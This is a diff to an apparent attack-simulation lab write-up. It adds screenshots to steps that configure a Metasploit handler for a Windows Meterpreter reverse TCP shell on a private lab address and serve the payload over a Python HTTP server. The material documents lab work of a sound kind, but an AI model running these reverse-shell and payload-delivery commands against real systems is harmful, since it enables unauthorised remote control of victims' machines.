@@ -45,16 +45,23 @@
 </p>
 
 <p>I then set up a listener in Metasploit to catch the reverse shell:</p>
+<p align="center">
+    <img src="https://github.com/bagaskarapd/Attack-Simulation/blob/main/Screenshots/msf6%20exploit.png?raw=true">
+</p>
 <pre>
 msfconsole
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.56.100
 set LPORT 4444
-run
+exploit
 </pre>
 
 <p>To deliver the payload, I hosted it using a Python HTTP server:</p>
+
+<p align="center">
+    <img src="https://github.com/bagaskarapd/Attack-Simulation/blob/main/Screenshots/Hosting%20.png?raw=true">
+</p>
 
 <pre>python3 -m http.server 9999</pre>
 
